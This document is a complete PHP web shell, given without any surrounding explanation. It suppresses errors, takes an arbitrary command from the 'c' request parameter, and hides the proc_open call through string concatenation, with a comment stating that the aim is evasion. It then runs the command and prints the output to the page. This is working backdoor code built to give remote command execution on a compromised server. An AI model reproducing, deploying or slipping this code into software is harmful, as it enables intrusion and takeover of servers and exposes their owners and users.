<?php
error_reporting(0);
@ini_set('display_errors', 0);

// Obfuscated variable names
$a = isset($_REQUEST['c'])?$_REQUEST['c']:'';
if ($a) {
    $b = 'pr'.'oc_op'.'en'; // String concatenation to hide function name
    if (function_exists($b)) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ];
        
        $c = $b($a, $descriptors, $pipes);
        if (is_resource($c)) {
            echo "<pre>" . stream_get_contents($pipes[1]) . "</pre>";
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($c);
        }
    }
}
?>
